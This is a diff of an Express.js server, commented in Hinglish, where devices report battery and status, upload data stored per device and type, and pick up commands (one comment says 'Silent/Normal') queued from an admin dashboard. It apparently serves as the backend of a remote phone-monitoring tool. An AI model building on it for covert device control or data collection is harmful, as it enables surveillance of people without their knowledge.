@@ -17,7 +17,7 @@ app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
 app.use(express.static(__dirname));
 
-// Live devices memory mein status ke liye
+// Live memory devices ka status rakhne ke liye
 let devicesStatus = {}; 
 
 // ==================================================
@@ -28,9 +28,10 @@ app.post('/api/status', (req, res) => {
     const { device_id, model, battery, version, charging } = req.body; 
     if (!device_id) return res.status(400).json({ error: "No Device ID" });
 
+    // Agar koi pending command hai toh nikal lo
     const pendingCommand = (devicesStatus[device_id] && devicesStatus[device_id].command) ? devicesStatus[device_id].command : "none";
 
-    // Status update logic
+    // Device status update karo
     devicesStatus[device_id] = {
         id: device_id,
         model: model || "Unknown Device",
@@ -38,10 +39,10 @@ app.post('/api/status', (req, res) => {
         version: version || "--",
         charging: charging === 'true' || charging === true,
         lastSeen: Date.now(),
-        command: "none" 
+        command: "none" // Command nikalte hi reset kar do
     };
 
-    console.log(`📡 Ping from: ${model} (${device_id}) | Bat: ${battery}%`);
+    console.log(`📡 Ping: ${model} | Bat: ${battery}% | Cmd: ${pendingCommand}`);
     res.json({ status: "success", command: pendingCommand });
 });
 
@@ -67,7 +68,6 @@ app.post('/api/upload_data', (req, res) => {
             if (!Array.isArray(existingData)) existingData = [];
 
             if (Array.isArray(parsedData)) {
-                // Unique entries merge logic
                 finalData = [...parsedData, ...existingData].slice(0, 2000); 
             } else {
                 existingData.unshift(parsedData);
@@ -90,12 +90,23 @@ app.post('/api/upload_data', (req, res) => {
 // 💻 DASHBOARD SIDE (Admin Side)
 // ==================================================
 
-// 1. Saare Devices ki List (Folders scan karke + Live Status)
+// --- YE MISSING THA: Specific Device ka status check karne ke liye ---
+app.get('/api/device-status/:id', (req, res) => {
+    const device = devicesStatus[req.params.id];
+    if (!device) return res.json({ isOnline: false });
+
+    const isOnline = (Date.now() - device.lastSeen) < 60000; // 60 seconds ping timeout
+    res.json({ 
+        ...device, 
+        isOnline 
+    });
+});
+
+// Saare Devices ki list (Dashboard home ke liye)
 app.get('/api/admin/all-devices', (req, res) => {
     const files = fs.readdirSync(UPLOADS_DIR);
     let deviceList = {};
 
-    // Uploads folder se devices ki history nikalna
     files.forEach(file => {
         const deviceId = file.split('_')[0];
         if (!deviceList[deviceId]) {
@@ -108,11 +119,10 @@ app.get('/api/admin/all-devices', (req, res) => {
             };
         }
     });
-
     res.json(deviceList);
 });
 
-// 2. Specific Data Fetch
+// Data fetch karne ke liye
 app.get('/api/get-data/:device_id/:type', (req, res) => {
     const { device_id, type } = req.params;
     const filePath = path.join(UPLOADS_DIR, `${device_id}_${type}.json`);
@@ -124,7 +134,7 @@ app.get('/api/get-data/:device_id/:type', (req, res) => {
     }
 });
 
-// 3. Command Send
+// Command bhejne ke liye (Silent/Normal etc)
 app.post('/api/send-command', (req, res) => {
     const { device_id, command } = req.body;
     if (!devicesStatus[device_id]) {
@@ -132,7 +142,7 @@ app.post('/api/send-command', (req, res) => {
     }
     
     devicesStatus[device_id].command = command;
-    console.log(`🚀 Cmd [${command}] queued for -> ${device_id}`);
+    console.log(`🚀 Command [${command}] queued for -> ${device_id}`);
     res.json({ status: "success" });
 });
 
